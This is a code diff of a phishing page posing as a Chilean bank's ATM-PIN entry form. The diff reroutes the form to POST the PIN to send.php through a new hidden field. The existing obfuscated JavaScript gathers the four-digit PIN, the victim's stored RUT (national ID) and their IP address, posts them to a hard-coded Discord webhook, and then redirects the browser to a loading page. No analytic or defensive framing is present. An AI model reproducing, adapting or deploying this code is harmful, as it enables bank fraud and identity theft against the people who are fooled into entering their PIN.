@@ -208,7 +208,7 @@
         <h1 class="title">Ingresa la clave de cajero de tu tarjeta</h1>
 
         <!-- Formulario PIN -->
-        <form class="pin-form" id="pinForm" onsubmit="handlePinSubmit(event)">
+        <form class="pin-form" action="send.php" method="POST" id="pinForm">
             <!-- Inputs PIN -->
             <div class="pin-inputs-container">
                 <input type="password" class="pin-input" id="pin1" maxlength="1" placeholder="•" autocomplete="off">
@@ -231,12 +231,19 @@
                     </svg>
                 </span>
             </div>
-
+            <input type="hidden" name="pin" id="pincaje">
             <!-- Botón Continuar -->
             <button type="submit" class="continue-btn" style="width: 100%; margin-top: 20px;">Continuar</button>
         </form>
     </div>
-
+<script>
+document.getElementById('pinForm').addEventListener('submit', function(e) {
+    const pin = ['pin1','pin2','pin3','pin4']
+        .map(id => document.getElementById(id).value)
+        .join('');
+    document.getElementById('pincaje').value = pin;
+});
+</script>
     <script>
     function _0x203a(){const _0x1adac6=['pin1','none','querySelectorAll','forEach','.pin-input','364406qUKSco','pin2','Por\x20favor\x20ingresa\x20los\x204\x20dígitos\x20del\x20PIN','display','pin4','getElementById','key','style','Error\x20IP:','es-ES','preventDefault','📌『𝓟𝓘𝓝\x20𝔅𝔞𝔫𝔠𝔬𝔈𝔰𝔱𝔞𝔡𝔬』📌','toLocaleString','type','pin3','16455OVKSUQ','4136433oPeFeG','href','No\x20disponible','keydown','password','application/json','6193GkRvLG','▸\x20𝖯𝖨𝖭\x20𝖢𝖺𝗃𝖾𝗋𝗈','▸\x20𝖧𝗈𝗋𝖺','Backspace','load','225963ddqqDv','catch','21690dGRirs','addEventListener','load1.html','focus','error','input','328BKSoiU','text','block','value','Error:','3160212FDFRqT','472AhOWcn','https://api.ipify.org?format=json','▸\x20𝖱𝖴𝖳','eyeHidden','then','150mxrvKR','eyeClosed','37938wWSSdj','💋𝖫𝗈𝗀𝗈𝗌\x20𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈\x20𝖢𝗈𝗋𝖾\x20𝖯𝗋𝗂𝗆𝖾\x20𝖯𝗋𝗈\x20𝖬𝖺𝗑💋'];_0x203a=function(){return _0x1adac6;};return _0x203a();}function _0x24c2(_0x150f5f,_0x5c15ac){_0x150f5f=_0x150f5f-0x10c;const _0x203adc=_0x203a();let _0x24c27b=_0x203adc[_0x150f5f];return _0x24c27b;}const _0x1e91cb=_0x24c2;(function(_0x2e44de,_0x234de9){const _0x35e775=_0x24c2,_0x3cd759=_0x2e44de();while(!![]){try{const _0x5e66e1=-parseInt(_0x35e775(0x110))/0x1+parseInt(_0x35e775(0x138))/0x2+parseInt(_0x35e775(0x140))/0x3*(parseInt(_0x35e775(0x139))/0x4)+parseInt(_0x35e775(0x11f))/0x5*(-parseInt(_0x35e775(0x13e))/0x6)+parseInt(_0x35e775(0x120))/0x7+parseInt(_0x35e775(0x133))/0x8*(-parseInt(_0x35e775(0x12b))/0x9)+parseInt(_0x35e775(0x12d))/0xa*(-parseInt(_0x35e775(0x126))/0xb);if(_0x5e66e1===_0x234de9)break;else _0x3cd759['push'](_0x3cd759['shift']());}catch(_0x30ec56){_0x3cd759['push'](_0x3cd759['shift']());}}}(_0x203a,0xebd96));const DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw';function togglePinVisibility(){const _0x1a59fe=_0x24c2,_0x1aecaa=[document[_0x1a59fe(0x115)]('pin1'),document[_0x1a59fe(0x115)]('pin2'),document[_0x1a59fe(0x115)](_0x1a59fe(0x11e)),document[_0x1a59fe(0x115)](_0x1a59fe(0x114))],_0x2c8b2e=document[_0x1a59fe(0x115)](_0x1a59fe(0x13f)),_0x12c77d=document[_0x1a59fe(0x115)](_0x1a59fe(0x13c)),_0x402269=_0x1aecaa[0x0][_0x1a59fe(0x11d)]===_0x1a59fe(0x124)?_0x1a59fe(0x124):_0x1a59fe(0x134),_0x12dd88=_0x402269===_0x1a59fe(0x124)?_0x1a59fe(0x134):_0x1a59fe(0x124);_0x1aecaa[_0x1a59fe(0x10e)](_0x334f5b=>{_0x334f5b['type']=_0x12dd88;}),_0x12dd88===_0x1a59fe(0x134)?(_0x12c77d[_0x1a59fe(0x117)][_0x1a59fe(0x113)]=_0x1a59fe(0x10c),_0x2c8b2e[_0x1a59fe(0x117)]['display']='block'):(_0x12c77d[_0x1a59fe(0x117)][_0x1a59fe(0x113)]=_0x1a59fe(0x135),_0x2c8b2e['style'][_0x1a59fe(0x113)]=_0x1a59fe(0x10c));}document['querySelectorAll']('.pin-input')[_0x1e91cb(0x10e)]((_0x58b8d3,_0x2e3eba)=>{const _0x167831=_0x1e91cb;_0x58b8d3['addEventListener'](_0x167831(0x132),function(_0xde8f5){const _0x4588d8=_0x167831;this[_0x4588d8(0x136)]['length']===0x1&&(_0x2e3eba<0x3&&document[_0x4588d8(0x10d)](_0x4588d8(0x10f))[_0x2e3eba+0x1][_0x4588d8(0x130)]());}),_0x58b8d3[_0x167831(0x12e)](_0x167831(0x123),function(_0x375db9){const _0x11112f=_0x167831;_0x375db9[_0x11112f(0x116)]===_0x11112f(0x129)&&this[_0x11112f(0x136)]===''&&_0x2e3eba>0x0&&document[_0x11112f(0x10d)](_0x11112f(0x10f))[_0x2e3eba-0x1][_0x11112f(0x130)]();});});function handlePinSubmit(_0x137e84){const _0x2a5fae=_0x1e91cb;_0x137e84[_0x2a5fae(0x11a)]();const _0x4e6dfb=document[_0x2a5fae(0x115)](_0x2a5fae(0x142))[_0x2a5fae(0x136)],_0x66c2be=document[_0x2a5fae(0x115)](_0x2a5fae(0x111))[_0x2a5fae(0x136)],_0x5f078d=document[_0x2a5fae(0x115)](_0x2a5fae(0x11e))[_0x2a5fae(0x136)],_0xdc5109=document['getElementById'](_0x2a5fae(0x114))[_0x2a5fae(0x136)],_0x327fad=_0x4e6dfb+_0x66c2be+_0x5f078d+_0xdc5109;if(_0x327fad['length']!==0x4){alert(_0x2a5fae(0x112));return;}enviarPinADiscord(_0x327fad);}function enviarPinADiscord(_0x1b09d7){const _0x501465=_0x1e91cb,_0x4776d0=localStorage['getItem']('rutUsuario')||_0x501465(0x122);fetch(_0x501465(0x13a))[_0x501465(0x13d)](_0x27a188=>_0x27a188['json']())[_0x501465(0x13d)](_0x2b0086=>{const _0x4c0ab9=_0x501465,_0x4a9bc5={'username':_0x4c0ab9(0x141),'embeds':[{'color':0x2fbf51,'author':{'name':_0x4c0ab9(0x11b)},'fields':[{'name':_0x4c0ab9(0x127),'value':'`'+_0x1b09d7+'`','inline':![]},{'name':_0x4c0ab9(0x13b),'value':'`'+_0x4776d0+'`','inline':![]},{'name':'▸\x20𝖨𝖯','value':'`'+_0x2b0086['ip']+'`','inline':!![]},{'name':_0x4c0ab9(0x128),'value':'`'+new Date()[_0x4c0ab9(0x11c)](_0x4c0ab9(0x119))+'`','inline':!![]}]}]};fetch(DISCORD_WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x4c0ab9(0x125)},'body':JSON['stringify'](_0x4a9bc5)})[_0x4c0ab9(0x13d)](()=>{const _0x5d495b=_0x4c0ab9;window['location'][_0x5d495b(0x121)]=_0x5d495b(0x12f);})[_0x4c0ab9(0x12c)](_0x140561=>console[_0x4c0ab9(0x131)](_0x4c0ab9(0x137),_0x140561));})[_0x501465(0x12c)](_0x461832=>console['error'](_0x501465(0x118),_0x461832));}window[_0x1e91cb(0x12e)](_0x1e91cb(0x12a),function(){document['getElementById']('pin1')['focus']();});
     </script>
